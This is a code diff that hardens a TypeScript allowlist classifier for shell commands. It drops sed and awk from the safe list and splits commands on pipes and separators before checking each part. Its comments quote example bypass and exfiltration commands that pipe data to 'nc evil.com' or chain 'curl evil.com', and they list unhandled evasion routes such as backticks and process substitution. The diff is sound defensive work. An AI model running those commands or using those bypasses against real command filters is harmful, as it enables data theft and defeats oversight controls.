@@ -92,8 +92,8 @@ const SAFE_PATTERNS: readonly RegExp[] = [
 	/^\s*node\s+--version/i,
 	/^\s*python\s+--version/i,
 	/^\s*jq\b/,
-	/^\s*sed\s+-n/i,
-	/^\s*awk\b/,
+	// sed -n removed — supports file writes via the 'w' flag (sed -n 'w /tmp/exfil' file).
+	// awk removed — supports system(), print > "file", and piped output.
 	/^\s*rg\b/,
 	/^\s*fd\b/,
 	/^\s*bat\b/,
@@ -101,18 +101,24 @@ const SAFE_PATTERNS: readonly RegExp[] = [
 ];
 
 /**
- * Returns `true` iff `command` matches at least one safe pattern and no
- * destructive pattern. When in doubt, blocks. Callers should surface the
- * block to the user with the offending command.
+ * Returns `true` iff every sub-command in `command` matches at least one safe
+ * pattern and no destructive pattern.
  *
- * Known limitation: SAFE_PATTERNS anchor to `^` while DESTRUCTIVE_PATTERNS
- * are unanchored substring checks. A pipeline like `git log; npm install`
- * passes the safe check (starts with `git log`) while the destructive segment
- * goes undetected. This is an intentional heuristic trade-off; callers that
- * need tighter control can split on `;`/`&&`/`||` and run both checks on
- * each sub-command independently.
+ * Splits on `|`, `||`, `&&`, and `;` before classification so a safe-prefixed
+ * command cannot bypass the classifier via `cat file | nc evil.com` or
+ * `git log && curl evil.com`.
+ *
+ * Remaining limitation: shell features like process substitution `$()`,
+ * backtick execution, and here-documents are not parsed; callers should treat
+ * this as a defence-in-depth heuristic rather than a security boundary.
  */
 export function isSafeCommand(command: string): boolean {
+	const parts = command.split(/\|{1,2}|&&|;/);
+	return parts.every((part) => isSafeSubcommand(part.trim()));
+}
+
+function isSafeSubcommand(command: string): boolean {
+	if (!command) return true; // empty fragment (e.g. trailing semicolon)
 	const isDestructive = DESTRUCTIVE_PATTERNS.some((p) => p.test(command));
 	if (isDestructive) return false;
 	return SAFE_PATTERNS.some((p) => p.test(command));
